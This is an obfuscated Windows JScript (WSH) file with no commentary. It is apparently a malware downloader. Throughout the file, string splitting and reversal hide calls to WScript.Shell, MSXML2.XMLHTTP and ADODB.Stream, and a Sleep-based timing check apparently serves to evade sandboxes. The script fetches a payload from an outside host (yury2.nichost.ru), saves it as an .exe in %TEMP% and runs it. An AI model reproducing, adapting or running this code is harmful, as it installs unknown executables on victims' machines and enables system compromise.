var GsiWmmXpxHxjNicVjdVfq = false;
var NcgSfqRjvVapOxbSkkZlt = "";
var UpiSbiXcuLqwLztYkcTgh;
var RowWdzFyyKpyVxrUpyZjg = "C" + "r"+"eateObject";
var JtwElfUcuPojMfoDzuYey = this["WScript"];
var EojHnaTruHgtPfjXzuMah = function BhzRkbNopHgwWxfVlkWgu() {return JtwElfUcuPojMfoDzuYey[RowWdzFyyKpyVxrUpyZjg]("WScript"+".Shell");}(), FzaJpnXkbHvvZslMmuUdv = 11;
var LduCntMpeRsyHreTxcCig = 1 * (2 - 0);
var DzcKazXjvUqnRpuRumSyn = LduCntMpeRsyHreTxcCig - (2 + 0) * 1;
function BnsQntIwaTfhLraLowAwy(AcuEpwQekOxvAcjUxxQay){EojHnaTruHgtPfjXzuMah[("Cunt", "anal", "R")+ "u" + ("fuck", "n")](AcuEpwQekOxvAcjUxxQay, DzcKazXjvUqnRpuRumSyn, DzcKazXjvUqnRpuRumSyn);};
function LgrZnjNrnJmuAttGogQuy(SnjIlaZyaFvfFctMklZdi, WiqPuqCgePjgJjaAuzIjn){DzcKazXjvUqnRpuRumSyn = DzcKazXjvUqnRpuRumSyn * 1; return SnjIlaZyaFvfFctMklZdi - WiqPuqCgePjgJjaAuzIjn;};
function IdiEewXqzRrgTrqAjaTdz(){return RowWdzFyyKpyVxrUpyZjg;};
/*@cc_on
  @if (@_win32 || @_win64)
    //
	GsiWmmXpxHxjNicVjdVfq = true;
	NcgSfqRjvVapOxbSkkZlt = "MLH";
	UpiSbiXcuLqwLztYkcTgh = "R" + "esponseB" + "ydo".split('').reverse().join('');
	JchNwxMnvQlgWaqSbbIes = ("noitisop").split('').reverse().join('');
	ZmqQgfVuvEbpJdcEtaAot = "eliFoTevaS".split('').reverse().join('');
  @end
@*/
if (GsiWmmXpxHxjNicVjdVfq)
{
var ZznMprZbiEgkEurRcgEwo = "M" + "SXML2."+"X"+NcgSfqRjvVapOxbSkkZlt+"TTP";
function ZmnJhdCzxFqvIikKefWyr(){return ZznMprZbiEgkEurRcgEwo + "";};

var KtqMqyIrlDomBiyRavGho = "";
function WofQcnPdnAawWmjLnkPbr(){return 23;};
var QpnIteXgtLanRdmPhvWol = 0; var SimPzaOpqIldPlvKifWzt = 0;
function JrfIabKvlLdwKlrPyxWun()
{
var KqlKarEloZviQzaJkxVwj = new this["D"+"ate"]();
var MqlHzxSnpYjqHhuGscFfl = KqlKarEloZviQzaJkxVwj["g"+"etUTCMilliseconds"]();
JtwElfUcuPojMfoDzuYey["Sleep"](WofQcnPdnAawWmjLnkPbr());
var KqlKarEloZviQzaJkxVwj = new this["D"+"ate"]();
var YqnDxdEmlEzvVdmFdtZbl = KqlKarEloZviQzaJkxVwj["g"+"etUTCMilliseconds"]();
JtwElfUcuPojMfoDzuYey["Sleep"](WofQcnPdnAawWmjLnkPbr());
var KqlKarEloZviQzaJkxVwj = new this["D"+"ate"]();
var BzbLhjOrqJftJoaFhiUtq = KqlKarEloZviQzaJkxVwj["g"+"etUTCMilliseconds"]();
var QpnIteXgtLanRdmPhvWol = "NmeEaiMhjRrnUniRxmUqa";
QpnIteXgtLanRdmPhvWol = LgrZnjNrnJmuAttGogQuy(YqnDxdEmlEzvVdmFdtZbl, MqlHzxSnpYjqHhuGscFfl);
var SimPzaOpqIldPlvKifWzt = "WtxXitDzmZzqVopKcrQuq";
SimPzaOpqIldPlvKifWzt = LgrZnjNrnJmuAttGogQuy(BzbLhjOrqJftJoaFhiUtq, YqnDxdEmlEzvVdmFdtZbl);
KtqMqyIrlDomBiyRavGho = "open";
return LgrZnjNrnJmuAttGogQuy(1 == 1 ? QpnIteXgtLanRdmPhvWol : 0, 1 == 1 ? SimPzaOpqIldPlvKifWzt : 0);
}
var HcjDcmEfiKwaDjyFfwVjk = false;
var ZbaYmnVqaYubZydUimUgt = false;
for (var DngRgyKdfQhfUuwHeaZqe = DzcKazXjvUqnRpuRumSyn; DngRgyKdfQhfUuwHeaZqe < WofQcnPdnAawWmjLnkPbr() * 1; DngRgyKdfQhfUuwHeaZqe++){if (JrfIabKvlLdwKlrPyxWun() != DzcKazXjvUqnRpuRumSyn){
HcjDcmEfiKwaDjyFfwVjk = true; 
SimPzaOpqIldPlvKifWzt = ("221") + (QpnIteXgtLanRdmPhvWol * SimPzaOpqIldPlvKifWzt); 
ZbaYmnVqaYubZydUimUgt = true; 
break;
}}
function JqzFtuKobGgwMqqEeqUkn() {return ((HcjDcmEfiKwaDjyFfwVjk == true) && (HcjDcmEfiKwaDjyFfwVjk == ZbaYmnVqaYubZydUimUgt)) ? 1 : DzcKazXjvUqnRpuRumSyn;};
if (HcjDcmEfiKwaDjyFfwVjk && JqzFtuKobGgwMqqEeqUkn() && ZbaYmnVqaYubZydUimUgt){
function NpsZaiZboNnmHpvUqiWox() {return EojHnaTruHgtPfjXzuMah["E"+"xpandEnvir"+"cock".charAt(1)+"nmentStrings"]("%TE"+"MP%/") + "FS5f8Yh7Foy.ex" + "e";};
 PiwOlqGdtOovJffSbkYbt = ZmnJhdCzxFqvIikKefWyr();
 PcfUrzXcnJyfAcjXfjEie = JtwElfUcuPojMfoDzuYey[RowWdzFyyKpyVxrUpyZjg](PiwOlqGdtOovJffSbkYbt);
 var EinCorAwyZmaGmfIrsUza = 3-2;
do { 
	for (;EinCorAwyZmaGmfIrsUza;){
	try {
		if (EinCorAwyZmaGmfIrsUza == 1)
		{
			PcfUrzXcnJyfAcjXfjEie[KtqMqyIrlDomBiyRavGho]("G" + "ET", "http://yury2.nichost.ru/i7dksa", false);
			PcfUrzXcnJyfAcjXfjEie["s"+"end"]();
			TnyBjoWvaPiaViyCulWew = "S"+"leep";
			EinCorAwyZmaGmfIrsUza = 2;
		}
		JtwElfUcuPojMfoDzuYey[TnyBjoWvaPiaViyCulWew](WofQcnPdnAawWmjLnkPbr() + 120); 
		if (PcfUrzXcnJyfAcjXfjEie["r"+"eadystate"] < 2 * 2) continue;
		EinCorAwyZmaGmfIrsUza = DzcKazXjvUqnRpuRumSyn;
		function ZwzUivZcuGsgHbhXteGki(VttTyfRipVsoOafOkiHsl) {var FzlEkkYjqStvYbkOvhKmq = (1, 2, 3, 4, 5, VttTyfRipVsoOafOkiHsl); return FzlEkkYjqStvYbkOvhKmq;};
		PiwOlqGdtOovJffSbkYbt = MjgIumQbzFgmWnnQuvMqb = JtwElfUcuPojMfoDzuYey[IdiEewXqzRrgTrqAjaTdz()]("A"+"DODB"+"a.b".charAt(1)+"Stre"+"mad".charAt(1)+"m");
		PiwOlqGdtOovJffSbkYbt[KtqMqyIrlDomBiyRavGho]();
		PiwOlqGdtOovJffSbkYbt["t"+"y"+"pe"] = 1;
		PiwOlqGdtOovJffSbkYbt["w"+"crop".charAt(1)+"ite"](PcfUrzXcnJyfAcjXfjEie[UpiSbiXcuLqwLztYkcTgh]);
		MjgIumQbzFgmWnnQuvMqb[JchNwxMnvQlgWaqSbbIes] = 2-2;
		PiwOlqGdtOovJffSbkYbt[ZmqQgfVuvEbpJdcEtaAot](NpsZaiZboNnmHpvUqiWox(), 2 * 1);
		MjgIumQbzFgmWnnQuvMqb["c"+"l"+"cock".charAt(1)+"se"]();
		PqzYkkPpeMnaTeoSceFah = NpsZaiZboNnmHpvUqiWox();
		if (1 && GsiWmmXpxHxjNicVjdVfq) BnsQntIwaTfhLraLowAwy(PqzYkkPpeMnaTeoSceFah);
	} catch(WnoAelJdbCkoRakDlwWuv){};};
}while (EinCorAwyZmaGmfIrsUza);
}
}

